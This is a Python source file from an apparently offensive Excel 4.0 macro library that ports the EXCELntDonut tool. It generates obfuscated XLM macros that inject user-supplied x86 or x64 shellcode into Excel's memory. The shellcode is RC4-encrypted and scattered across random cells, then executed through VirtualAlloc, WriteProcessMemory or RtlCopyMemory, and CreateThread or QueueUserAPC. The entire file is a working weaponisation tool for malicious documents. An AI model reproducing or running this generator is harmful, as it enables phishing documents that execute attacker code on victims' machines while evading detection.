import sys
from excel4lib.generator.generator import *
from excel4lib.lang import *
from excel4lib.macro.routine import Excel4Routines
from excel4lib.utils.rc4 import *
from excel4lib.macro.obfuscator import *

class Excel4NtDonutGenerator(Excel4Generator):
    '''
    `Excel4NtDonutGenerator` allows to generate Excel 4.0 Macro that injects C# code into Excel memory.

     This is a port of EXCELntDonut tool written by joeleonjr: https://github.com/FortyNorthSecurity/EXCELntDonut.
     `Excel4NtDonutGenerator` uses different obfuscation techniques and could be translated into other languages.
     Also it allows to generate macro that injects only x86 or x64 shellcode.
    '''
    description = "Port of EXCELntDonut tool written by joeleonjr: https://github.com/FortyNorthSecurity/EXCELntDonut"
    name = "Excel4NtDonutGenerator"


    def __init__(self, worksheet_name="Excel4NtDonutGenerator"):

        Excel4Generator.__init__(self, worksheet_name, obfuscator=Excel4Rc4Obfuscator(), routines=Excel4Routines(), desc=Excel4NtDonutGenerator.description)
        self.obfuscators = self.obfuscators + []

    def custom_args(self):
        '''
        Adds command line arguments to ArgumentParser
        '''
        self.args_parser.add_argument("--inputx86", "-i86", required=False, help="path to x86 shellcode")
        self.args_parser.add_argument("--inputx64", "-i64", required=False, help="path to x64 shellcode")


    def _inject_x86(self, shellcode_path):
        '''
        Puts Excel 4.0 macro that injects x86 shellcode into Excel memory

        :param shellcode_path: path to x86 shellcode
        '''
        # Read shellcode
        shellcode = read_file(shellcode_path, "rb")
        # Encrypt shellcode
        key = RC4.get_key(random.randint(8,16))
        shellcode_encrypted = RC4.encrypt_logic(key, shellcode)
        shellcode_cells =[]
        # Place shellcode at random cell
        self.macro.worksheet.set_current_cords(random.randint(10,125), random.randint(10,250))
        key_value = self.macro.value(key)
        # Put encrypted shellcode in worksheet
        for block in split_blocks(shellcode_encrypted, random.randint(16,32) * 4):
            shellcode_cell = self.macro.value(block.lower())
            shellcode_cell._obfuscate = False
            shellcode_cells.append(shellcode_cell)

        #self.macro.keep_call_order = True
        self.macro.worksheet.set_current_cords(random.randint(10, 125), random.randint(10, 250))
        # Register WinApi functions for x86 arch
        start_address = self.macro.value(random_string(random.randint(10,25)))
        virtual_alloc = self.macro.register_virtual_alloc("VirtualAlloc")
        write_proc_mem = self.macro.register_write_process_memory("WriteProcessMemory")
        create_thread = self.macro.register_create_thread("CreateThread")

        # Allocate memory
        allocated_mem = self.macro.formula(virtual_alloc, 0, len(shellcode), 4096, 64)
        # Points to cell from which shellcode is copied
        shellptr = self.macro.variable("shellptr", shellcode_cells[0])
        key_ptr = self.macro.variable("key", key_value)
        self.macro.routines.get("Excel4RC4RoutineStr").set_macro_arguments(shellptr, key_ptr)
        rc4_init, rc4_dec = self.macro.routines.get("Excel4RC4RoutineStr").add()
        written_bytes = self.macro.variable("writtenbts", 0)
        # Copy shellcode to allocated memory
        shellptr_len = self.macro.argument("LEN", shellptr)
        # Initialize RC4
        self.macro.formula(rc4_init.name)
        self.macro.loop("WHILE", self.macro.logical(shellptr_len, ">", 0))
        block = self.macro.variable("block", self.macro.argument(rc4_dec.name))
        block_len = self.macro.argument("LEN", block)

        # Copy cell content to memory
        self.macro.formula(write_proc_mem, -1, self.macro.operator(allocated_mem, "+", written_bytes), block, block_len, 0)
        # Increment written bytes
        self.macro.variable(written_bytes.name, self.macro.operator(written_bytes, "+", block_len))
        # Move shellcode ptr to next cell
        self.macro.variable(shellptr.name, self.macro.argument("ABSREF", "{}[1]{}".format(Excel4Translator.get_row_character(), Excel4Translator.get_col_character()), shellptr))
        # End WHILE loop
        self.macro.end_loop("NEXT")

        # Create thread
        self.macro.formula(create_thread, 0,0, allocated_mem,0 ,0, 0)
        self.macro.formula("HALT")
        return start_address

    def _inject_x64(self, shellcode_path):
        '''
        Puts Excel 4.0 macro that injects x64 shellcode into Excel memory

        :param shellcode_path: path to x64 shellcode
        '''
        # Read shellcode
        shellcode = read_file(shellcode_path, "rb")
        # Encrypt shellcode
        key = RC4.get_key(random.randint(8, 16))
        shellcode_encrypted = RC4.encrypt_logic(key, shellcode)
        shellcode_cells = []
        decrypted = RC4.decrypt(key, shellcode_encrypted)

        # Place shellcode at random cell
        self.macro.worksheet.set_current_cords(random.randint(10, 125), random.randint(10, 250))
        key_value = self.macro.value(key)
        # Put encrypted shellcode in worksheet
        for block in split_blocks(shellcode_encrypted, random.randint(16, 32) * 4):
            shellcode_cell = self.macro.value(block.lower())
            shellcode_cell._obfuscate = False
            shellcode_cells.append(shellcode_cell)

        #self.macro.keep_call_order = True
        self.macro.worksheet.set_current_cords(random.randint(10, 125), random.randint(10, 250))
        start_address = self.macro.value(random_string(random.randint(10, 25)))
        # Register WinApi functions for x64 arch
        virtual_alloc = self.macro.register_virtual_alloc("VirtualAlloc")
        rtl_copy_mem = self.macro.register_rtl_copy_memory("RtlCopyMemory")
        address_to_allocated = self.macro.variable("addresstoaloc", 1342177280)
        allocated_mem = self.macro.variable("allocatedmem", 0)

        # Try to allocate memory for shellcode
        self.macro.loop("WHILE", self.macro.logical(allocated_mem, "=", 0))
        va_call = self.macro.argument(virtual_alloc, address_to_allocated, len(shellcode), 12288, 64)
        self.macro.variable(allocated_mem.name, va_call)
        self.macro.variable(address_to_allocated.name, self.macro.operator(address_to_allocated, "+", 262144))
        # End of loop
        self.macro.end_loop("NEXT")
        queue_user_apc = self.macro.register_queue_user_apc("QueueUserAPC")
        nt_test_alert = self.macro.register_nt_test_alert("NtTestAlert")
        # Points to cell from which shellcode is copied
        shellptr = self.macro.variable("shellptr", shellcode_cells[0])
        key_ptr = self.macro.variable("key", key_value)
        self.macro.routines.get("Excel4RC4RoutineStr").set_macro_arguments(shellptr, key_ptr)
        rc4_init, rc4_dec = self.macro.routines.get("Excel4RC4RoutineStr").add()
        written_bytes = self.macro.variable("writtenbts", 0)
        # Copy shellcode to allocated memory
        shellptr_len = self.macro.argument("LEN", shellptr)
        # Initialize RC4
        self.macro.formula(rc4_init.name)
        self.macro.loop("WHILE", self.macro.logical(shellptr_len, ">", 0))
        block = self.macro.variable("block", self.macro.argument(rc4_dec.name))
        block_len = self.macro.argument("LEN", block)
        self.macro.formula(rtl_copy_mem, self.macro.operator(allocated_mem, "+", written_bytes), block, block_len)
        # Copy cell content to memory
        # Increment written bytes
        self.macro.variable(written_bytes.name, self.macro.operator(written_bytes, "+", block_len))
        # Move shellcode ptr to next cell
        self.macro.variable(shellptr.name, self.macro.argument("ABSREF", "{}[1]{}".format(Excel4Translator.get_row_character(), Excel4Translator.get_col_character()), shellptr))
        # End WHILE loop
        self.macro.end_loop("NEXT")
        # Create thread
        self.macro.formula(queue_user_apc, allocated_mem, -2, 0)
        self.macro.formula(nt_test_alert)
        self.macro.formula("HALT")
        self.macro.keep_call_order = True
        return start_address

    def generate_macro(self):
        '''
        Generates macro
        '''
        print("[*] Creating macro with command ...")
        x86_routine = None
        x64_routine = None
        if self.args.inputx64:
            x64_routine = self._inject_x64(self.args.inputx64)
        if self.args.inputx86:
            x86_routine = self._inject_x86(self.args.inputx86)

        self.macro.worksheet.set_current_cords(1,1)

        if x86_routine and x64_routine:
            # Add architecture detection
            self.macro.check_architecture(x86_routine, x64_routine)
        else:
            # Add jump to inject routine
            if x86_routine:
                self.macro.goto(x86_routine)
            elif x64_routine:
                self.macro.goto(x64_routine)

        print("[*] Macro created")
        if not self.args.disable_obfuscation:
            Excel4Config.obfuscator.enable = True
            print("[*] Obfsucating macro with {} obfuscator ...".format(self.obfuscator.name))
        else:
            Excel4Config.obfuscator.enable = False
        print("[*] Saving output to {} ...".format(self.args.out))
        self.macro.to_csv_file(self.args.out)
        print("[*] Output saved to {}".format(self.args.out))
        print("[*] Trigger cords: column: {} row: {}".format(self.macro.trigger_x, self.macro.trigger_y))

    @staticmethod
    def run(args):
        '''
        Runs generator

        :param args: cli arguments
        '''
        generator = Excel4NtDonutGenerator()
        generator.init_args()
        if len(args) == 0:
            generator.args_parser.print_help()
            sys.exit(1)
        generator.parse(args)
        generator.generate()


if __name__ == '__main__':
    Excel4NtDonutGenerator.run(sys.argv[1:])